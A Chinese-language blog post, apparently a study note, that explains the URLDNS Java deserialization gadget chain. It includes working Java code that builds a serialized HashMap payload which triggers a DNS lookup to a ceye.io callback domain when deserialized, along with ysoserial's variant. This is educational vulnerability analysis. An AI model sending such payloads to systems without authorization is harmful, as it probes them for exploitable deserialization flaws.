---
title: URLDNS
key: URLDNS
---

## 前言

URLDNS利用链不依赖任何第三方库，同时对JDK版本也没有限制，所以通常用于确认readobject反序列化利用点的存在。

## 漏洞复现

```java
package com.theoyu.urldns;
import java.io.*;
import java.lang.reflect.Field;
import java.net.URL;
import java.net.URLEncoder;
import java.util.Base64;
import java.util.HashMap;

public class Demo1 {
    public static void main(String[] args)throws Exception {
        HashMap hashMap = new HashMap();
        URL url = new URL("http://6i79lz.ceye.io");
        Field field = Class.forName("java.net.URL").getDeclaredField("hashCode");
        field.setAccessible(true);
        field.set(url,123);
        hashMap.put(url,"theoyu");
        field.set(url,-1);
        ObjectOutputStream objectOutputStream =new ObjectOutputStream(new FileOutputStream("ser.bin"));
        objectOutputStream.writeObject(hashMap);

        File file= new File("ser.bin");
        InputStream inputStream = new FileInputStream(file);
        byte[] b =new byte[(int)file.length()];
        inputStream.read(b);
        System.out.println(URLEncoder.encode(new String(Base64.getEncoder().encode(b))));
    }
}
```





![image-20211107141306641](https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/11/20211107141306.png)



## 漏洞分析

```
Gadget Chain:(JDK8)
  HashMap.readObject()
    JDK8->HashMap.putVal();JDK7->HashMap.putForCreate()
      HashMap.hash()
        URL.hashCode()
          URLStreamHandler.hashCode()
            URLStreamHandler.getHostAddress()   
```

关于hash表的基础也就不在这过多介绍了，简单来说hash表就是根据**键**（Key）而直接访问在内存储存位置的数据结构，而由于key的数据类型不同，我们会有不同的**散列函数**`hashcode()`处理key来获得一个index值,当index最后落在同一个位置时，就会引起hash冲突，不过这不在我们的讨论范围内。

那么看看针对URL类型的key，java是怎么处理`hashcode()`

```java
URL url = new URL("https://theoyu.top/");
System.out.println(url.hashCode());
```

java.net.URLStreamHandler->`hashcode()`

![image-20211105214616560](https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/11/20211105214623.png)

想必你已经差不多知道sink点在哪了，就是`getHostAddress()`，在这里触发了DNS查询，或者再往上说一些，只要我们对URL类型的key进行了`hashcode()`运算，也就达到了目的。

现在我们从HashMap的`readobject()`从头梳理一遍
java.util.HashMap -> `readobject()`

![image-20211107153401061](https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/11/20211107153401.png)

这里的s也就是ObjectInputStream对象，从里面强制读取key和value，重点关注下一步`putVal()`的第一个参数，跟进

java.util.HashMap -> `hash()`

![image-20211107154416512](https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/11/20211107154416.png)

这里调用了key的`hashcode()`的方法，而我们只需要把key实例化为URL的对象，那么就接上了最开始的java.net.URLStreamHandler->`hashcode()`，这样看其实只需要三步

1. new一个URL对象，值为解析DNS所对应的地址

2. new一个HashMap对象，类型为<URL,随意>，再把URL对象put进去

3. objectOutputStream.writeObject(hashMap);

但是回头看PoC，似乎多了三步

![image-20211107155709277](https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/11/20211107155709.png)

如果没有这三步，直接put对象，会怎么样呢？其实也比较好理解，我们在构造Poc的时候hashMap.put直接触发`hashCode()`,也就导致了DNS解析,并且写入URL对象的私有成员hashCode也是已经经过了计算之后的值。我们回头看看java.net.URL->`hashcode()`

![image-20211107161200555](https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/11/20211107161200.png)

对私有成员hashCode进行了判断，如果hashCode不等于 -1 那么就直接进行返回了，也就是说如果安装最初的流程，DNS解析并不是发生在目标readobject，而是我们本地生成poc....😅那么上面新加的三步也就可以很好的解释：

1. 通过反射拿到私有成员hashCode，并绕过访问限制。
2. 在put之前随意修改hashCode，绕过运算
3. 在写入之前把hashCode重置为-1

ysoseria是怎么做的呢？，发现其并没有这三步，而是重写了URLStreamHandler

```java
URLStreamHandler handler = new SilentURLStreamHandler();
HashMap ht = new HashMap(); 
URL u = new URL(null, url, handler); 
ht.put(u, url);
Reflections.setFieldValue(u, "hashCode", -1); 

static class SilentURLStreamHandler extends URLStreamHandler {
	protected URLConnection openConnection(URL u) throws IOException {
  	return null;
	}
	protected synchronized InetAddress getHostAddress(URL u) {
		return null;
	}
}
```

在SilentURLStreamHandler中强行把getHostAddress直接return一个null，也就绕过了本地解析，并且ysoseria专门写了一个`Reflections`类处理反射所需要的各种操作，也就直接设置了hashCode为-1.

